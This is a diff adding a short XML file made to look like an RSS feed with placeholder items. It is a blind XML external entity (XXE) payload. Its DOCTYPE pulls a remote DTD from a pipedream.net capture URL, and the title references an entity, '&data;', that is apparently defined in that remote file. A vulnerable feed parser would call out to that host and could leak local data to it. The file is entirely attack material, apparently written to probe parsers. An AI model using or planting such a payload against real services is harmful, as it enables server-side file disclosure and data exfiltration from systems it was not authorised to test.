@@ -1,0 +1,25 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ELEMENT rss ANY>
+  <!ENTITY % sp SYSTEM "https://022b0d4fc5ca54f440504013751d320f.m.pipedream.net">
+  %sp;
+]>
+<rss>
+    <channel>
+        <item>
+            <title>
+               &data;
+               title
+            </title>
+            <link>
+                hello
+            </link>
+            <description>
+                lol
+            </description>
+            <pubDate>
+                pubdate
+            </pubDate>
+        </item>
+    </channel>
+</rss>
